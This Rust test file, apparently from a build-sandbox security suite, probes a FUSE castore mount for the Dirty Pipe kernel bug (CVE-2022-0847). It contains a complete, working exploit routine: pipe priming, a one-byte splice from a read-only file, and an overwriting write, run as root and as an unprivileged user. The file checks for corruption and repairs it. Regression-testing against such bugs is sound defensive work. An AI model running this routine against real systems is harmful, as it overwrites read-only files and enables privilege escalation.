//! Page-cache write attacks that never go through a FUSE write op, so
//! the EROFS open/write-op guards (findings F-C/F-D) cannot see them.
//!
//! The castore mount serves reads from the node-shared backing cache
//! via FUSE passthrough, so the backing file's page-cache pages are
//! the same pages every build on the node reads for that digest. A
//! kernel bug that lets an unprivileged (or root) reader scribble on a
//! read-only file's page cache therefore has the same blast radius as
//! the fixed F-C write-through hole — a corrupted shared digest served
//! to every co-tenant build — but reaches it through `splice`/pipe
//! instead of `CastoreFs::open`. generic/680 is the canonical instance
//! (Dirty Pipe, CVE-2022-0847).

use std::fs;
use std::io;
use std::os::fd::{AsFd, AsRawFd};
use std::os::unix::fs::FileExt;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, bail, ensure};
use nix::errno::Errno;
use nix::fcntl::{FcntlArg, fcntl};
use nix::unistd::pipe;

use super::{Ctx, Outcome, PrivDrop, wait_for};

/// generic/680 — Dirty Pipe (CVE-2022-0847) against the castore mount.
///
/// The exploit opens a file O_RDONLY (always allowed; the
/// `builder.fs.open-read-only` guard only rejects write modes), primes
/// a pipe so every `pipe_buffer` keeps `PIPE_BUF_FLAG_CAN_MERGE`,
/// splices one byte from the file into the pipe to pin its page-cache
/// page, then `write(2)`s attacker bytes into the pipe. On a kernel
/// with the uninitialized-`flags` bug those bytes merge straight into
/// the pinned page-cache page, overwriting a read-only file with no
/// write syscall and no DAC check.
///
/// On the castore mount the pinned page is a page of the node-shared
/// backing cache file (FUSE passthrough), so a successful overwrite
/// corrupts the digest for every build on the node — the F-C blast
/// radius by a path that never touches `CastoreFs::open`. Both legs
/// (root and the unprivileged build uid) must leave the file
/// byte-identical through the mount; the backing cache file is checked
/// too when `--cache-dir` is given. A regression repairs the cache
/// file before failing so the rest of the suite sees clean bytes.
pub fn generic_680_dirty_pipe(ctx: &Ctx) -> anyhow::Result<Outcome> {
    let big = &ctx.manifest.big_file;
    let target = ctx.on_mount(&big.path);
    let oracle = ctx.manifest.oracle_bytes();

    // Probe only the first page; the splice trick can only touch bytes
    // within the page the spliced byte belongs to.
    let page = 4096usize;
    let original_head = fs::read(&target)?
        .get(..page)
        .map(<[u8]>::to_vec)
        .context("probe target is smaller than one page")?;
    ensure!(
        original_head == oracle[..page],
        "{} head differs from the oracle before the probe",
        big.path
    );

    // Distinct from the repeating payload, so a successful overwrite is
    // unambiguous. Writes file bytes [1, 1+len): offset 1 is not page-
    // aligned and the range stays inside page 0 (the two constraints
    // the exploit needs).
    let attack = b"RIO-DIRTYPIPE-PROBE-680";

    // Root leg: CAP_DAC_OVERRIDE does not matter here (no DAC check is
    // involved); root is just xfstests' default identity.
    ensure!(
        nix::unistd::geteuid().is_root(),
        "the dirty-pipe probe must start as root"
    );
    let root_ran = dirty_pipe_attempt(&target, attack).context("dirty-pipe attempt as root")?;
    assert_head_unchanged(ctx, &target, &original_head, "root leg")?;

    // Unprivileged leg: the build uid has read (o+r on 0444) so the
    // O_RDONLY open and the splice both succeed; only the page-cache
    // merge would be the escalation.
    let unpriv_ran = {
        let _guard = PrivDrop::to(ctx.probe_uid, ctx.probe_gid)?;
        dirty_pipe_attempt(&target, attack).context("dirty-pipe attempt as the build uid")?
    };
    assert_head_unchanged(ctx, &target, &original_head, "unprivileged leg")?;

    println!(
        "    dirty-pipe attempts completed (root: {}, build-uid: {}); \
         file unchanged through the mount",
        ran_str(root_ran),
        ran_str(unpriv_ran),
    );
    if !root_ran && !unpriv_ran {
        // splice never moved a byte on either leg — the attack could
        // not even start, so the integrity assertion is vacuous.
        return Ok(Outcome::Skip(
            "splice from the mount returned 0 bytes (passthrough splice unsupported here)",
        ));
    }
    Ok(Outcome::Pass)
}

/// Run one full Dirty-Pipe sequence against `target`. Returns whether
/// the splice actually moved the byte the attack needs (false ⇒ the
/// attack could not start, e.g. splice unsupported on this fd).
fn dirty_pipe_attempt(target: &Path, data: &[u8]) -> anyhow::Result<bool> {
    debug_assert!(data.len() < 4095, "data must fit in page 0 after offset 1");

    let (rd, wr) = pipe().context("pipe()")?;
    let pipe_sz = fcntl(wr.as_fd(), FcntlArg::F_GETPIPE_SZ).context("F_GETPIPE_SZ")?;
    ensure!(pipe_sz > 0, "F_GETPIPE_SZ returned {pipe_sz}");
    let pipe_sz = pipe_sz as usize;

    // Fill then drain the pipe so every pipe_buffer is left with
    // PIPE_BUF_FLAG_CAN_MERGE set (the precondition the bug needs).
    let zeros = vec![0u8; 4096];
    let mut left = pipe_sz;
    while left > 0 {
        let n =
            nix::unistd::write(wr.as_fd(), &zeros[..left.min(zeros.len())]).context("fill pipe")?;
        if n == 0 {
            break;
        }
        left -= n;
    }
    let mut sink = vec![0u8; 4096];
    let sink_len = sink.len();
    let mut drained = pipe_sz - left;
    while drained > 0 {
        let n = nix::unistd::read(rd.as_fd(), &mut sink[..drained.min(sink_len)])
            .context("drain pipe")?;
        if n == 0 {
            break;
        }
        drained -= n;
    }

    let file =
        fs::File::open(target).with_context(|| format!("open {} O_RDONLY", target.display()))?;

    // Splice one byte from file offset 0 into the pipe, pinning page 0;
    // the merge target is then file byte 1. `splice` lives behind nix's
    // `zerocopy` feature (not enabled in this workspace), so call libc
    // directly rather than pull a workspace-wide feature in.
    let mut off: nix::libc::loff_t = 0;
    let spliced = unsafe {
        nix::libc::splice(
            file.as_fd().as_raw_fd(),
            &mut off,
            wr.as_fd().as_raw_fd(),
            std::ptr::null_mut(),
            1,
            0,
        )
    };
    if spliced < 0 {
        let err = Errno::last();
        // EINVAL: this fd does not support splice-out to a pipe. The
        // attack cannot start; report "did not run".
        if err == Errno::EINVAL {
            return Ok(false);
        }
        return Err(io::Error::from(err)).context("splice file -> pipe");
    }
    if spliced == 0 {
        return Ok(false);
    }

    // The escalating write: on a vulnerable kernel this merges into the
    // pinned page-cache page instead of allocating a new pipe_buffer.
    let mut written = 0;
    while written < data.len() {
        match nix::unistd::write(wr.as_fd(), &data[written..]) {
            Ok(0) => break,
            Ok(n) => written += n,
            Err(Errno::EAGAIN) => break,
            Err(e) => return Err(io::Error::from(e)).context("write attack bytes into pipe"),
        }
    }
    Ok(spliced > 0)
}

/// Assert the first page through the mount still matches `original`. If
/// it was mutated (a live Dirty-Pipe regression), repair the backing
/// cache file when `--cache-dir` is available, then fail loudly.
fn assert_head_unchanged(
    ctx: &Ctx,
    target: &Path,
    original: &[u8],
    leg: &str,
) -> anyhow::Result<()> {
    let after = fs::read(target)?;
    let head = after.get(..original.len()).unwrap_or(&after);
    if head == original {
        return Ok(());
    }

    // Corruption: restore the shared cache before bailing so the rest
    // of the suite (and co-tenant builds) do not read poisoned bytes.
    let repaired = match &ctx.cache_dir {
        Some(cache_dir) => {
            repair_backing_cache(cache_dir, &ctx.manifest.oracle_bytes(), original).is_ok()
        }
        None => false,
    };
    bail!(
        "FINDING: Dirty Pipe ({leg}) modified {} through the read-only mount — \
         page-cache write hole (CVE-2022-0847 class); shared backing cache {}",
        target.display(),
        if repaired {
            "repaired"
        } else {
            "NOT repaired (no --cache-dir)"
        }
    );
}

/// Rewrite the original head bytes into the backing cache file for the
/// target's digest. Mirrors `errno_battery::write_through_passthrough_root`'s
/// repair step.
///
/// The cache is keyed by the blake3 digest of the FULL original content
/// (the content-addressed identity) — not the probed head and not the
/// now-corrupted on-disk bytes — so the digest comes from the manifest
/// oracle. Writing back just the head is sufficient: Dirty Pipe can only
/// touch the page containing the spliced byte, which is page 0.
fn repair_backing_cache(cache_dir: &Path, full_original: &[u8], head: &[u8]) -> anyhow::Result<()> {
    let digest_hex = blake3::hash(full_original).to_hex();
    let cache_file = cache_dir
        .join(&digest_hex.as_str()[..2])
        .join(digest_hex.as_str());
    wait_for(
        "backing cache file to exist for repair",
        Duration::from_secs(5),
        || cache_file.exists(),
    )?;
    let f = fs::OpenOptions::new()
        .write(true)
        .open(&cache_file)
        .context("open cache file for repair")?;
    f.write_all_at(head, 0).context("rewrite original head")?;
    Ok(())
}

fn ran_str(ran: bool) -> &'static str {
    if ran { "ran" } else { "splice no-op" }
}
